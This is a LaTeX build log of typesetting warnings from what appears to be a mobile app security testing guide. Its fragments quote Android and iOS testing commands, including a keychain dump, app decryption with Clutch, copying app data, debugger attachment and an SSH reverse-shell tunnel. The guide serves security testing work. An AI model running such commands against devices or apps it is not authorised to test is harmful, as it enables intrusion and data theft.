ceCodePro(6)/m/n/10.95 meta-data \TU/SourceSansPro(0)/m/n/10.95 entries with va
lues such as \TU/SourceCodePro(6)/m/n/10.95 DATABASE\TU/SourceSansPro(0)/m/n/10
.95 ,
[444] [445] [446] [447]
Overfull \hbox (1.35373pt too wide) in paragraph at lines 25810--25811
[][][]$[][][][][] [] [] [] [][][][][][][][][][][][][][][][][][][][] [] [][][] [
] [][] [][] [][][][][][][] [] [][][][][][][] [] [][][][] [] [][] [] [][][][][][
][] [][] [][][][][][][][][] [][] [][][][] [][] [][][][][][][][][] []

Overfull \hbox (7.87286pt too wide) in paragraph at lines 25828--25830
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][
][][][][][][][][][][][][][][][][][][][][][][][][] []

Overfull \hbox (3.53665pt too wide) in paragraph at lines 25830--25832
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][][][][][] [] [][][
][][][][][][][][][][][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 25832--25834
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][] [] [][][][][][][][][][] [] [][][][][][][][][][] [] [][][][][][][][][][
][] [] [][][][][][][][][][] [] [][][][] []
[448]
Underfull \hbox (badness 10000) in paragraph at lines 25846--25848
[][][]$[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] []
[][][][] [] [][][][][][] [][] [][][][] [][] [][][][][][][] [] [][][][][][][] []
[] [][][][][][][] [] [][][][][][][] [][] [][][][][][][] [][] [][][] [][]
[449]
Overfull \hbox (73.06233pt too wide) in paragraph at lines 25981--25983
[]\TU/SourceSansPro(0)/m/n/10.95 APK signatures can be verified with the \TU/So
urceCodePro(6)/m/n/10.95 apksigner \TU/SourceSansPro(0)/m/n/10.95 tool. It is l
ocated at \TU/SourceCodePro(6)/m/n/10.95 [SDK-Path]/build-tools/[version]\TU/So
urceSansPro(0)/m/n/10.95 . 
[450]
Overfull \hbox (25.46947pt too wide) in paragraph at lines 26008--26008
[]      \TU/SourceCodePro(6)/m/n/10.95 [CertPath not validated: Path doesn\[]t 
chain with any of the trust anchors][] 
[451]
Underfull \hbox (badness 3826) in paragraph at lines 26069--26072
[]\TU/SourceSansPro(0)/m/n/10.95 Drozer can be used to determine whether an app
lication is debuggable. The Drozer module

Underfull \hbox (badness 2401) in paragraph at lines 26069--26072
\TU/SourceCodePro(6)/m/n/10.95 app.package.attacksurface \TU/SourceSansPro(0)/m
/n/10.95 also displays information about IPC components exported by
[452]
Overfull \hbox (969.35915pt too wide) in paragraph at lines 26105--26105
[]\TU/SourceCodePro(6)/m/n/10.95 uid=10084(u0_a84) gid=10084(u0_a84) groups=100
83(u0_a83),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(
net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:untrusted_
app:s0:c512,c768[] 

Overfull \hbox (4.66437pt too wide) in paragraph at lines 26148--26148
 []\TU/SourceCodePro(6)/m/n/10.95 $ jdb -connect com.sun.jdi.SocketAttach:hostn
ame=localhost,port=55555[] 
[453]
Overfull \hbox (299.21928pt too wide) in paragraph at lines 26199--26199
[]\TU/SourceCodePro(6)/m/n/10.95 export $NM = $ANDROID_NDK_DIR/toolchains/arm-l
inux-androideabi-4.9/prebuilt/darwin-x86_64/bin/arm-linux-androideabi-nm[] 

Overfull \hbox (286.07933pt too wide) in paragraph at lines 26206--26206
[]\TU/SourceCodePro(6)/m/n/10.95 /tmp/toolchains/arm-linux-androideabi-4.9/preb
uilt/darwin-x86_64/bin/arm-linux-androideabi-nm: libfoo.so: no symbols[] 
[454] [455]
Overfull \hbox (8.12468pt too wide) in paragraph at lines 26283--26287
[]\TU/SourceSansPro(0)/m/n/10.95 To determine whether \TU/SourceCodePro(6)/m/n/
10.95 StrictMode \TU/SourceSansPro(0)/m/n/10.95 is enabled, you can look for th
e \TU/SourceCodePro(6)/m/n/10.95 StrictMode.setThreadPolicy
[456] [457] [458]
Overfull \hbox (36.4194pt too wide) in paragraph at lines 26485--26485
[]    \TU/SourceCodePro(6)/m/n/10.95 id "com.github.hierynomus.license-report" 
version"{license_plugin_version}"[] 
[459]
Overfull \hbox (68.55766pt too wide) in paragraph at lines 26565--26577
[]\TU/SourceSansPro(0)/m/n/10.95 Plan for standard \TU/SourceCodePro(6)/m/n/10.
95 RuntimeException\TU/SourceSansPro(0)/m/n/10.95 s (e.g.\TU/SourceCodePro(6)/m
/n/10.95 NullPointerException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro
(6)/m/n/10.95 IndexOutOfBoundsException\TU/SourceSansPro(0)/m/n/10.95 ,

Underfull \hbox (badness 3713) in paragraph at lines 26565--26577
\TU/SourceCodePro(6)/m/n/10.95 ActivityNotFoundException\TU/SourceSansPro(0)/m/
n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 CancellationException\TU/SourceSansPro
(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 SQLException\TU/SourceSansPro(0)
/m/n/10.95 ) by cre-
[460] [461] [462] [463]
Overfull \hbox (1.37952pt too wide) in paragraph at lines 26850--26850
[]            \TU/SourceCodePro(6)/m/n/10.95 // Includes the default ProGuard r
ules files that are packaged with[] 

Overfull \hbox (3.56953pt too wide) in paragraph at lines 26850--26850
[]            \TU/SourceCodePro(6)/m/n/10.95 // the Android Gradle plugin. To l
earn more, go to the section about[] 
[464] [465]
Underfull \hbox (badness 10000) in paragraph at lines 26966--26969
[]\TU/SourceSansPro(0)/m/n/10.95 Drozer - [][]$[][][][][] [] [] [] [][][][] [] 
[][][][][][][][][][][][][][][] [] [][][] [] [][][][][][] [] [][][][][][][][][] 
[] [][][][] [][] [][][][][][] [][] [][][][] [][] [][][][][] [][] [][][][] [][] 
[][] [][]
[466]
Underfull \hbox (badness 1226) in paragraph at lines 27019--27021
[]\TU/SourceSansPro(0)/m/n/10.95 APK signature scheme with key rotation - [][]$
[][][][][] [] [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][
] [] [][][][][][][][] [] [][][] []
[467] [468]
Underfull \hbox (badness 10000) in paragraph at lines 27167--27171
[]\TU/SourceSansPro(0)/m/n/10.95 Trust APK information (\TU/SourceCodePro(6)/m/
n/10.95 apkPackageName\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n
/10.95 apkCertificateDigestSha256 \TU/SourceSansPro(0)/m/n/10.95 and
[469]
Underfull \hbox (badness 1478) in paragraph at lines 27207--27211
[]\TU/SourceSansPro(0)/m/n/10.95 Follow this [][]checklist[][] to ensure that y
ou’ve completed each of the steps needed to integrate the
[470]
Overfull \hbox (59.78313pt too wide) in paragraph at lines 27289--27295
[]\TU/SourceSansPro(0)/m/n/10.95 Another way of determining whether \TU/SourceC
odePro(6)/m/n/10.95 su \TU/SourceSansPro(0)/m/n/10.95 exists is attempting to e
xecute it through the \TU/SourceCodePro(6)/m/n/10.95 Runtime.getRuntime.exec
[471]
Underfull \hbox (badness 2608) in paragraph at lines 27298--27306
\TU/SourceSansPro(0)/m/n/10.95 the \TU/SourceCodePro(6)/m/n/10.95 ActivityManag
er.getRunningAppProcesses \TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(
6)/m/n/10.95 manager.getRunningServices
[472] [473] [474]
Overfull \hbox (26.04254pt too wide) in paragraph at lines 27517--27521
[]\TU/SourceSansPro(0)/m/n/10.95 While this might be pretty obvious to circumve
nt for a reverse engineer, you can use \TU/SourceCodePro(6)/m/n/10.95 isDebugge
rConnected
[475] [476]
Overfull \hbox (96.55685pt too wide) in paragraph at lines 27631--27635
[]\TU/SourceSansPro(0)/m/n/10.95 One way to overwrite the method pointers is to
 overwrite the address of the function \TU/SourceCodePro(6)/m/n/10.95 jdwpAdbSt
ate::ProcessIncoming
[477] [478] [479]
Overfull \hbox (36.41943pt too wide) in paragraph at lines 27802--27802
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a151   18190 201   1535844 54908 ffffffff b
6e0f124 S sg.vantagepoint.antidebug[] 

Overfull \hbox (40.79942pt too wide) in paragraph at lines 27802--27802
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a151   18224 18190 1495180 35824 c019a3ac b
6e0ee5c S sg.vantagepoint.antidebug[] 
[480] [481]
Overfull \hbox (42.98943pt too wide) in paragraph at lines 27924--27924
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a152   20267 201   1552508 56796 ffffffff b
6e0f124 S sg.vantagepoint.anti-debug[] 

Overfull \hbox (47.36942pt too wide) in paragraph at lines 27924--27924
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a152   20301 20267 1495192 33980 c019a3ac b
6e0ee5c S sg.vantagepoint.anti-debug[] 
[482] [483] [484]
Underfull \hbox (badness 6445) in paragraph at lines 28109--28113
[]\TU/SourceSansPro(0)/m/n/10.95 The following [][]sample implementation from t
he Android Cracking blog[][] calculates a CRC over
[485] [486] [487] [488] [489] [490]
Overfull \hbox (12.87714pt too wide) in paragraph at lines 28454--28460
\TU/SourceSansPro(0)/m/n/10.95 (e.g. [][]GET_SIGNING_CERTIFICATES[][] 

Overfull \hbox (23.40738pt too wide) in paragraph at lines 28509--28515
\TU/SourceCodePro(6)/m/n/10.95 Runtime.getRuntime().exec 
[491] [492] [493] [494]
Overfull \hbox (5.75964pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getDeviceId()                
          0[]s                     emulator[] 

Overfull \hbox (25.4696pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getLine1 Number()            
          155552155               emulator[] 

Overfull \hbox (80.21959pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkCountryIso()       
          us                      possibly emulator[] 

Overfull \hbox (64.88963pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkType()             
          3                       possibly emulator[] 

Overfull \hbox (110.87949pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkOperator().substrin
g(0,3)    310                     possibly emulator[] 

Overfull \hbox (106.49951pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getNetworkOperator().substrin
g(3)      260                     possibly emulator[] 

Overfull \hbox (60.50964pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getPhoneType()               
          1                       possibly emulator[] 

Overfull \hbox (71.45963pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getSimCountryIso()           
          us                      possibly emulator[] 

Overfull \hbox (58.3195pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getSimSerial Number()        
          89014103211118510720    emulator[] 

Overfull \hbox (40.79956pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getSubscriberId()            
          310260000000000         emulator[] 

Overfull \hbox (38.60956pt too wide) in paragraph at lines 28678--28678
[]\TU/SourceCodePro(6)/m/n/10.95 TelephonyManager.getVoiceMailNumber()         
          15552175049             emulator[] 
[495]
Overfull \hbox (63.5245pt too wide) in paragraph at lines 28777--28777
[]\TU/SourceCodePro(6)/bx/n/10 if[]\TU/SourceCodePro(6)/m/n/10 (stackTraceEleme
nt.[]getClassName[]().[]equals[]([]"com.android.internal.os.ZygoteInit"[])) 
[496]
Overfull \hbox (63.5245pt too wide) in paragraph at lines 28787--28787
[]\TU/SourceCodePro(6)/bx/n/10 if[]\TU/SourceCodePro(6)/m/n/10 (stackTraceEleme
nt.[]getClassName[]().[]equals[]([]"de.robv.android.xposed.XposedBridge"[]) 

Overfull \hbox (63.5245pt too wide) in paragraph at lines 28791--28791
[]\TU/SourceCodePro(6)/bx/n/10 if[]\TU/SourceCodePro(6)/m/n/10 (stackTraceEleme
nt.[]getClassName[]().[]equals[]([]"de.robv.android.xposed.XposedBridge"[]) 
[497] [498]
Overfull \hbox (156.98944pt too wide) in paragraph at lines 28940--28940
\TU/SourceCodePro(6)/m/it/10 <https://developer.android.com/reference/android/s
ecurity/keystore/KeyGenParameterSpec.html>[]|  
[499]
Overfull \hbox (156.98944pt too wide) in paragraph at lines 28967--28967
\TU/SourceCodePro(6)/m/it/10 <https://developer.android.com/reference/android/s
ecurity/keystore/KeyGenParameterSpec.html>[]|  
[500]
Underfull \hbox (badness 10000) in paragraph at lines 29068--29070
[]\TU/SourceCodePro(6)/m/n/10.95 Settings.Secure.bluetooth_address\TU/SourceSan
sPro(0)/m/n/10.95 , unless the system permission LO-
[501]
Overfull \hbox (224.53432pt too wide) in paragraph at lines 29092--29096
\TU/SourceCodePro(6)/m/n/10.95 Build.Serial\TU/SourceSansPro(0)/m/n/10.95 . The
 file should contain the permission \TU/SourceCodePro(6)/m/n/10.95 <uses-permis
sion android:name="android.permission.READ_PHONE_STATE"

Overfull \hbox (7.42747pt too wide) in paragraph at lines 29098--29100
[]\TU/SourceSansPro(0)/m/n/10.95 Apps for Android 8.0 (API level 26) will get t
he result “UNKNOWN” when they request \TU/SourceCodePro(6)/m/n/10.95 Build.Seri
al\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (2.6277pt too wide) in paragraph at lines 29134--29138
[]\TU/SourceSansPro(0)/m/n/10.95 Copy the contents of \TU/SourceCodePro(6)/m/n/
10.95 /data/data/<your appid>/cache \TU/SourceSansPro(0)/m/n/10.95 and \TU/Sour
ceCodePro(6)/m/n/10.95 shared-preferences

Overfull \hbox (51.87105pt too wide) in paragraph at lines 29152--29155
[]\TU/SourceSansPro(0)/m/n/10.95 Execute \TU/SourceCodePro(6)/m/n/10.95 run-as 
<your app-id>\TU/SourceSansPro(0)/m/n/10.95 . Your app-id is the package descri
bed in \TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml\TU/SourceSansPro(0)/m
/n/10.95 . 
[502] [503]
Overfull \hbox (30.89949pt too wide) in paragraph at lines 29234--29234
\TU/SourceCodePro(6)/m/n/10 iid.[]getToken[](tokenItem.[]authorizedEntity[],tok
enItem.[]scope[],tokenItem.[]options[]);|  
[504] [505]
Underfull \hbox (badness 10000) in paragraph at lines 29388--29392
[]\TU/SourceCodePro(6)/m/n/10.95 Settings.Secure.bluetooth_address \TU/SourceSa
nsPro(0)/m/n/10.95 or \TU/SourceCodePro(6)/m/n/10.95 WifiInfo.getMacAddress \TU
/SourceSansPro(0)/m/n/10.95 from

Underfull \hbox (badness 1112) in paragraph at lines 29407--29411
[]\TU/SourceSansPro(0)/m/n/10.95 To make sure that the identifiers can be used,
 check \TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml \TU/SourceSansPro(0)/
m/n/10.95 for usage of the

Underfull \hbox (badness 2781) in paragraph at lines 29407--29411
\TU/SourceSansPro(0)/m/n/10.95 IMEI and \TU/SourceCodePro(6)/m/n/10.95 Build.Se
rial\TU/SourceSansPro(0)/m/n/10.95 . The manifest should contain the permission
 \TU/SourceCodePro(6)/m/n/10.95 <uses-permission
[506]
Underfull \hbox (badness 2253) in paragraph at lines 29499--29501
[]\TU/SourceSansPro(0)/m/n/10.95 SafetyNet Attestation API - Quota Request - []
[]$[][][][][] [] [] [] [][][][][][][] [] [][][][][][] [] [][][] [] [][][][][][]
[][][][] [] [][][][][][][] [][]
[507] [508] [509]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d4e80dd1320b9b3dc91c94b0608a477026670825.
png" > [510] [511] [512] [513]
Overfull \hbox (7.5151pt too wide) in paragraph at lines 29770--29775
[]\TU/SourceSansPro(0)/m/n/10.95 The app process is restricted to its own direc
tory (under /var/mobile/Containers/Bundle/Application/
[514]
Underfull \hbox (badness 1137) in paragraph at lines 29867--29872
[]\TU/SourceCodePro(6)/m/n/10.95 /iTunesMetadata.plist \TU/SourceSansPro(0)/m/n
/10.95 contains various bits of information, including the developer’s
[515]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/fa9295f5a7912d06f00eca6564a177c1bf1338c5.
png" > [516] [517] [518]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cf54b9aca2296ed3eaa6ecf814484f24668e5af6.
png" > [519] [520] [521] [522] [523] [524] [525] [526] [527]
Overfull \hbox (84.59961pt too wide) in paragraph at lines 30737--30737
[]   \TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC     ARM         V7  0x00     EXECU
TE    39       5016   NOUNDEFS DYLDLINK TWOLEVEL PIE[] 

Overfull \hbox (97.73956pt too wide) in paragraph at lines 30737--30737
[]\TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC_64   ARM64        ALL  0x00     EXECU
TE    38       5728   NOUNDEFS DYLDLINK TWOLEVEL PIE[] 

Overfull \hbox (145.91933pt too wide) in paragraph at lines 30748--30748
[]\TU/SourceCodePro(6)/m/n/10.95 $ dsdump --objc --color --verbose=5 --arch arm
64 --defined [APP_MAIN_BINARY_FILE] > /tmp/OBJC.txt[] 

Overfull \hbox (73.64946pt too wide) in paragraph at lines 30748--30748
[]\TU/SourceCodePro(6)/m/n/10.95 # Dump the Swift type descriptors to a tempora
ry file if the app is implemented in Swift[] 

Overfull \hbox (159.05933pt too wide) in paragraph at lines 30748--30748
[]\TU/SourceCodePro(6)/m/n/10.95 $ dsdump --swift --color --verbose=5 --arch ar
m64 --defined [APP_MAIN_BINARY_FILE] > /tmp/SWIFT.txt[] 

Overfull \hbox (49.5594pt too wide) in paragraph at lines 30767--30767
[]\TU/SourceCodePro(6)/m/n/10.95 $ docker run -it -p 8000:8000 opensecurity/mob
ile-security-framework-mobsf:latest[] 
[528]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a70d91db8c881c205f3831ecfd5d5432ce6c4610.
png" > [529] [530]
Overfull \hbox (73.6494pt too wide) in paragraph at lines 30914--30914
[]\TU/SourceCodePro(6)/m/n/10.95 OWASP.iGoat-Swift on (iPhone: 12.0) [usb] # io
s hooking list class_methods <ClassName>[] 

Overfull \hbox (10.1394pt too wide) in paragraph at lines 30950--30950
[]\TU/SourceCodePro(6)/m/n/10.95 $ objection patchipa --source my-app.ipa --cod
esign-signature 0C2E8200Dxxxx[] 
[531]
Overfull \hbox (165.62943pt too wide) in paragraph at lines 31000--31000
[]\TU/SourceCodePro(6)/m/n/10.95 # Dump the Keychain, including access modifier
s. The result will be written to the host in myfile.json[] 
[532]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/fe6365453719e80590d3afce7e4cc779feb735be.
png" > [533]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/941c3323ce1e22f1181dbd2b8ebcd856dd4552a7.
png" > [534] [535] [536]
Overfull \hbox (60.21677pt too wide) in paragraph at lines 31220--31222
[]\TU/SourceSansPro(0)/m/n/10.95 Opening a reverse shell over SSH can be done b
y running the command \TU/SourceCodePro(6)/m/n/10.95 ssh -R <remote_port>:local
host:22

Overfull \hbox (321.11931pt too wide) in paragraph at lines 31258--31258
[]\TU/SourceCodePro(6)/m/n/10.95 iPhone:~ root# tar czvf /tmp/data.tgz /private
/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693[] 

[537]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7d582611b62d36df15e2e70aa59f9b3edb63ceb5.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/47ac539e21259f375afeadf39e3185e10750e8d0.
png" > [538]
Overfull \hbox (242.27933pt too wide) in paragraph at lines 31308--31308
[]\TU/SourceCodePro(6)/m/n/10.95 Current directory: /var/containers/Bundle/Appl
ication/DABF849D-493E-464C-B66B-B8B6C53A4E76/org.owasp.MSTG.app[] 

Overfull \hbox (382.4393pt too wide) in paragraph at lines 31316--31316
[]\TU/SourceCodePro(6)/m/n/10.95 org.owasp.MSTG on (iPhone: 10.3.3) [usb] # cd 
/var/mobile/Containers/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/Do
cuments[] 

Overfull \hbox (95.54933pt too wide) in paragraph at lines 31316--31316
[]\TU/SourceCodePro(6)/m/n/10.95 /var/mobile/Containers/Data/Application/72C7AA
FB-1D75-4FBA-9D83-D8B4A2D44133/Documents[] 

Overfull \hbox (215.99937pt too wide) in paragraph at lines 31329--31329
[]\TU/SourceCodePro(6)/m/n/10.95 org.owasp.MSTG on (iPhone: 10.3.3) [usb] # fil
e download .com.apple.mobile_container_manager.metadata.plist[] 

Overfull \hbox (791.96916pt too wide) in paragraph at lines 31329--31329
[]\TU/SourceCodePro(6)/m/n/10.95 Downloading /var/mobile/Containers/Data/Applic
ation/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_container_manager.
metadata.plist to .com.apple.mobile_container_manager.metadata.plist[] 

Overfull \hbox (868.61916pt too wide) in paragraph at lines 31329--31329
[]\TU/SourceCodePro(6)/m/n/10.95 Successfully downloaded /var/mobile/Containers
/Data/Application/72C7AAFB-1D75-4FBA-9D83-D8B4A2D44133/.com.apple.mobile_contai
ner_manager.metadata.plist to .com.apple.mobile_container_manager.metadata.plis
t[] 
[539]
Overfull \hbox (246.65932pt too wide) in paragraph at lines 31348--31348
[]\TU/SourceCodePro(6)/m/n/10.95 itms-services://?action=download-manifest&url=
https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.plist[] 

Overfull \hbox (467.84929pt too wide) in paragraph at lines 31362--31362
[]\TU/SourceCodePro(6)/m/n/10.95 # itms-services -u "itms-services://?action=do
wnload-manifest&url=https://s3-ap-southeast-1.amazonaws.com/test-uat/manifest.p
list" -o - > out.ipa[] 

Overfull \hbox (82.40947pt too wide) in paragraph at lines 31424--31424
[]\TU/SourceCodePro(6)/m/n/10.95 //     Generated by class-dump 3.5 (64 bit) (D
ebug version compiled Jun  9 2015 22:53:21).[] 

Overfull \hbox (45.17947pt too wide) in paragraph at lines 31424--31424
[]\TU/SourceCodePro(6)/m/n/10.95 //     class-dump is Copyright (C) 1997-1998, 
2000-2001, 2004-2014 by Steve Nygard.[] 
[540]
Overfull \hbox (56.12941pt too wide) in paragraph at lines 31449--31449
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-04 20:16:57.807 Clutch[2449:440427] co
mmand: Prints installed applications[] 
[541]
Overfull \hbox (108.68944pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-04 20:19:28.460 Clutch[2450:440574] co
mmand: Dump specified bundleID into .ipa file[] 

Overfull \hbox (402.14938pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 ph.telegra.Telegraph contains watchOS 2 compat
ible application. It[]s not possible to dump watchOS 2 apps with Clutch (null) 
at this moment.[] 

Overfull \hbox (159.05942pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-04 20:19:29.825 clutch[2465:440618] co
mmand: Only dump binary files from specified bundleID[] 

Overfull \hbox (119.63936pt too wide) in paragraph at lines 31470--31470
[]\TU/SourceCodePro(6)/m/n/10.95 DONE: /private/var/mobile/Documents/Dumped/ph.
telegra.Telegraph-iOS9.0-(Clutch-(null)).ipa[] 

Overfull \hbox (82.40947pt too wide) in paragraph at lines 31496--31496
[]\TU/SourceCodePro(6)/m/n/10.95 //     Generated by class-dump 3.5 (64 bit) (D
ebug version compiled Jun  9 2015 22:53:21).[] 

Overfull \hbox (45.17947pt too wide) in paragraph at lines 31496--31496
[]\TU/SourceCodePro(6)/m/n/10.95 //     class-dump is Copyright (C) 1997-1998, 
2000-2001, 2004-2014 by Steve Nygard.[] 

Overfull \hbox (56.12943pt too wide) in paragraph at lines 31496--31496
[]\TU/SourceCodePro(6)/m/n/10.95 typedef void (^CDUnknownBlockType)(void); // r
eturn type and parameters are unknown[] 
[542] [543]
Overfull \hbox (399.95929pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 start dump /private/var/containers/Bundle/Appl
ication/14002D30-B113-4FDF-BD25-1BF740383149/Telegram.app/Frameworks/libswiftsi
md.dylib[] 

Overfull \hbox (7.9494pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 libswiftsimd.dylib.fid: 100%|██████████| 343k/
343k [00:00<00:00, 1.54MB/s][] 

Overfull \hbox (426.23929pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 start dump /private/var/containers/Bundle/Appl
ication/14002D30-B113-4FDF-BD25-1BF740383149/Telegram.app/Frameworks/libswiftCo
reData.dylib[] 

Overfull \hbox (40.79938pt too wide) in paragraph at lines 31553--31553
[]\TU/SourceCodePro(6)/m/n/10.95 libswiftCoreData.dylib.fid: 100%|██████████| 8
2.5k/82.5k [00:00<00:00, 477kB/s][] 
[544]
Overfull \hbox (117.44943pt too wide) in paragraph at lines 31646--31646
[]\TU/SourceCodePro(6)/m/n/10.95 # The following command will show detailed inf
ormation about the iOS device connected via USB.[] 

Overfull \hbox (82.40936pt too wide) in paragraph at lines 31646--31646
[]\TU/SourceCodePro(6)/m/n/10.95 WARNING: could not locate Payload/iGoat-Swift.
app/SC_Info/iGoat-Swift.sinf in archive![] 

Overfull \hbox (522.5994pt too wide) in paragraph at lines 31646--31646
[]\TU/SourceCodePro(6)/m/n/10.95 # The following command will start the app in 
debug mode, by providing the bundle name. The bundle name can be found in the p
revious command after "Installing".[] 
[545] [546] [547]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/10a4f9e98e7c4b14b4396229660b6b6c0fe7f30d.
png" > [548] [549]
Overfull \hbox (102.94426pt too wide) in paragraph at lines 31941--31946
[]\TU/SourceSansPro(0)/m/n/10.95 Exported/imported \TU/SourceSansPro(0)/m/it/10
.95 custom document types\TU/SourceSansPro(0)/m/n/10.95 : \TU/SourceCodePro(6)/
m/n/10.95 UTExportedTypeDeclarations\TU/SourceSansPro(0)/m/n/10.95 /\TU/SourceC
odePro(6)/m/n/10.95 UTImportedTypeDeclarations
[550]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/67df79153b351160650e3671f95ec4d358cdb42e.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/66f4454a50ab09521142216735c12da384b6ebe1.
png" > [551]
Overfull \hbox (12.32903pt too wide) in paragraph at lines 32008--32008
[]\TU/SourceCodePro(6)/m/n/10.95 ------------  -------  ------------------  ...
  ----------------------------[] 
[552]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/24668459a85228c7fd3205ac60e616120c5fa265.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5a8b4b5da9d5f0e362687fe04a7d34d52f468738.
png" > [553]
Overfull \hbox (99.92937pt too wide) in paragraph at lines 32075--32075
[]\TU/SourceCodePro(6)/m/n/10.95 Bundle: /private/var/containers/Bundle/Applica
tion/3ADAF47D-A734-49FA-B274-FBCA66589E67[] 

Overfull \hbox (237.89934pt too wide) in paragraph at lines 32075--32075
[]\TU/SourceCodePro(6)/m/n/10.95 Application: /private/var/containers/Bundle/Ap
plication/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app[] 

Overfull \hbox (119.63934pt too wide) in paragraph at lines 32075--32075
[]\TU/SourceCodePro(6)/m/n/10.95 Data: /private/var/mobile/Containers/Data/Appl
ication/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693[] 
[554]
Overfull \hbox (248.84866pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 -----------------  ---------------------------
----------------------------------------------------------------[] 

Overfull \hbox (207.23938pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 BundlePath         /var/containers/Bundle/Appl
ication/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app[] 

Overfull \hbox (244.46931pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 CachesDirectory    /var/mobile/Containers/Data
/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches[] 

Overfull \hbox (215.99931pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 DocumentDirectory  /var/mobile/Containers/Data
/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents[] 

Overfull \hbox (200.66934pt too wide) in paragraph at lines 32091--32091
[]\TU/SourceCodePro(6)/m/n/10.95 LibraryDirectory   /var/mobile/Containers/Data
/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library[] 

Overfull \hbox (134.17004pt too wide) in paragraph at lines 32098--32101
[]\TU/SourceSansPro(0)/m/n/10.95 The Bundle directory (\TU/SourceCodePro(6)/m/n
/10.95 /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/
\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (155.42393pt too wide) in paragraph at lines 32101--32103
[]\TU/SourceSansPro(0)/m/n/10.95 The Data directory (\TU/SourceCodePro(6)/m/n/1
0.95 /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB06
93/\TU/SourceSansPro(0)/m/n/10.95 ). 
[555]
Overfull \hbox (120.74524pt too wide) in paragraph at lines 32229--32232
